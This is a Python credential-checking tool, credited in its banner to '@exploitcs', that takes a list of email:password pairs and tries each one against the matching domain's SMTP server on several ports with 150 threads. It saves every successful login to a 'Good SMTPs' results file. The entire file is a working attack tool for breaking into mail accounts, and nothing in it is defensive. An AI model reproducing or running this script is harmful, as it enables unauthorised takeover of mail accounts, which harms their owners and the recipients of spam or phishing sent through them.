import sys, requests, re, smtplib, os, time
from multiprocessing.dummy import Pool
from colorama import Fore, init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
fy  =   Fore.YELLOW
fb  =   Fore.BLUE

requests.urllib3.disable_warnings()

def log() :
    log =  """  Author : @exploitcs
        {} Fucker cPanel/SMTP / WHM SOON
        {} Ussage : open cmd python SMTPsCracker2096
        {} Note ! : list must like this test@domain.com:domain1234
    """.format(fr, fw, fg, fr, fg, fr, fg, fr, fg, fr, fw, fg)
    for line in log.split("\n"):
        print(line)
        time.sleep(0.15)

def input_KOWK(txt):
    try :
        if (sys.version_info[0] < 3):
            return raw_input(txt).strip()
        else :
            sys.stdout.write(txt)
            return input()
    except:
        return False

def URLdomain_KOWK(site):
    if (site.startswith("http://")) :
        site = site.replace("http://", "")
    elif (site.startswith("https://")) :
        site = site.replace("https://", "")
    if ('www.' in site) :
        site = site.replace("www.", "")
    if ('/' in site):
        site = site.rstrip()
        site = site.split('/')[0]
    return site

def SMTP_KOWK(c):
    try :
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        host = URLdomain_KOWK(email.split('@')[1])
        ports = ['587', '25', '465', '2525']
        for port in ports :
            try :
                if (port == '465'):
                    server = smtplib.SMTP_SSL(host, port)
                else :
                    server = smtplib.SMTP(host, port)
                server.starttls()
                server.login(email, pwd)
                smtp = '{}|{}|{}|{}'.format(host, port, email, pwd)
                open('Result/Good_2096_SMTPs.txt', 'a').write(smtp + '\n')
                print  (' [+] {}{} [GOOD]'.format(fg, smtp))
                break
            except :
                pass
    except :
        pass

def exploit(c):
    try :
        c = c.strip()
        print  (' [X] ' + c)
        SMTP_KOWK(c)
    except:
        pass

def run():
    log()
    try:
        target = open(sys.argv[1], 'r')
    except:
        yList = str(input_KOWK('\n   List --> : '))
        if (not os.path.isfile(yList)):
            print("\n   {}({}) File does not exist !!\n".format(fr, yList))
            sys.exit(0)
        target = open(yList, 'r')
    mp = Pool(150)
    mp.map(exploit, target)
    mp.close()
    mp.join()

run()
